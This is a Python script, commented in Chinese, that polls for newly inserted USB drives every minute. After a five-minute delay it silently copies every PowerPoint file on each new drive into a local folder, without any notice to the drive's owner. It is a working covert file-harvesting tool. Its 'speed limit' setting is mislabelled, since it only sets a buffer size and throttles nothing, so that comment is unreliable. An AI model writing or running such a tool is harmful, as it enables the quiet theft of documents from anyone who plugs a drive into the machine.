import os
import shutil
import time
import psutil
 
# 获取本机硬盘盘符列表
def get_disk_drives():
    disk_partitions = psutil.disk_partitions(all=False)
    drives = [partition.device.upper() for partition in disk_partitions if partition.fstype != "" and "removable" in partition.opts]
    return drives
 
# 拷贝 U盘中的 .ppt.pptx 文件到 指定目录
def copy_ppt_files(source_folder, destination_folder, speed_limit_kb):
    for root, dirs, files in os.walk(source_folder):
        for file in files:
            if file.endswith((".ppt", ".pptx")):
                src_file = os.path.join(root, file)
                dst_root = root.replace(source_folder, destination_folder)
                dst_file = os.path.join(dst_root, file)
                os.makedirs(dst_root, exist_ok=True)
                with open(src_file, 'rb') as fsrc:
                    with open(dst_file, 'wb') as fdst:
                        shutil.copyfileobj(fsrc, fdst, length=speed_limit_kb * 1024)
 
# 检查是否有新的 U 盘插入
def check_for_new_drive(speed_limit_kb=1024):  # 默认速度限制为 1024 KB/s
    drives = get_disk_drives()
    drives = [drive for drive in drives if drive not in excluded_drives]
    new_drives = [drive for drive in drives if drive not in known_drives]
    for new_drive in new_drives:
        known_drives.append(new_drive)
        print(f"New drive detected: {new_drive}")
        time.sleep(300)  # 等待300秒后再开始拷贝
        copy_ppt_files(new_drive, destination_drive, speed_limit_kb)
 
if __name__ == "__main__":
    # 已知的驱动器列表，用于检测新插入的驱动器
    known_drives = []
    excluded_drives = [drive + ':' for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"]
    destination_drive = "d:\\Download\\"  # 目标路径
    # 检查目标路径是否存在，如果不存在则创建它
    if not os.path.exists(destination_drive):
        os.makedirs(destination_drive)
    # 每隔一分钟检查U盘一次
    while True:
        check_for_new_drive()
        time.sleep(60)  # 等待60秒